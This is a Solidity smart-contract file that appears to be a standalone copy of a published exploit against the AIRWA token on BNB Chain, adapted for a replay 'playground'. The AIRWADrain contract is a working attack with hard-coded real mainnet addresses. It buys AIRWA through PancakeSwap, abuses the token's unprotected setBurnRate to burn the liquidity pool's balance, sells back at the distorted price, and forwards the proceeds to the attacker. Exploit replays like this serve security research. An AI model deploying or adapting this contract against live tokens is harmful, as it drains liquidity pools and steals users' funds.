// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Synthetic standalone exploit for the EVM Playground — a faithful copy of
// AttackContract from evm-hack-registry/2025-04-AIRWA_exp/test/AIRWA_exp.sol,
// with ONE change: `attack()` is marked `payable`. The original test funds
// the contract via `new AttackContract{value: 0.1 ether}()` at deploy time,
// but the playground's recorder never sends value with the deploy call — only
// with the recorded attack-function call (`attackValueWei`). Since this
// contract's `receive()` immediately forwards any incoming balance back to
// the attacker (matching the original — a defensive sweep-back), a plain
// pre-attack value transfer would just drain right back out before attack()
// runs. Making attack() payable lets the 0.1 ether arrive atomically with the
// call that uses it, which is behaviorally identical to funding the
// constructor: nothing reads the balance before this call, so the timing
// doesn't matter, only that the contract holds 0.1 ether native currency
// during attack()'s execution.
//
// All addresses, call sequence, and logic are copied verbatim from the
// original test file.

address constant AIRWA = 0x3Af7DA38C9F68dF9549Ce1980eEf4AC6B635223A;
address constant wBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant CAKE_LP = 0xc3551400c032cB0556dee1AD1dC78D1cbC64B7bb;

interface IPancakeRouter {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IAIRWA {
    function setBurnRate(uint256 _burnRate) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract AIRWADrain {
    address attacker;

    constructor() {
        attacker = msg.sender;
    }

    // `payable` (only diff from the original AttackContract.attack()) so the
    // recorder can fund this call's 0.1 ether swap-in capital via attackValueWei.
    function attack() public payable {
        address[] memory path = new address[](3);
        path[0] = address(wBNB);
        path[1] = address(BSC_USD);
        path[2] = address(AIRWA);
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.1 ether}(
            0, path, address(this), block.timestamp + 10
        );

        uint256 balance = IAIRWA(AIRWA).balanceOf(address(this));
        IAIRWA(AIRWA).setBurnRate(980);
        IAIRWA(AIRWA).transfer(CAKE_LP, 0);
        IAIRWA(AIRWA).setBurnRate(0);
        IAIRWA(AIRWA).approve(PANCAKE_ROUTER, type(uint256).max);

        path[0] = address(AIRWA);
        path[1] = address(BSC_USD);
        path[2] = address(wBNB);
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance, 0, path, address(this), block.timestamp + 10
        );
    }

    receive() external payable {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            payable(attacker).transfer(balance);
        }
    }
}
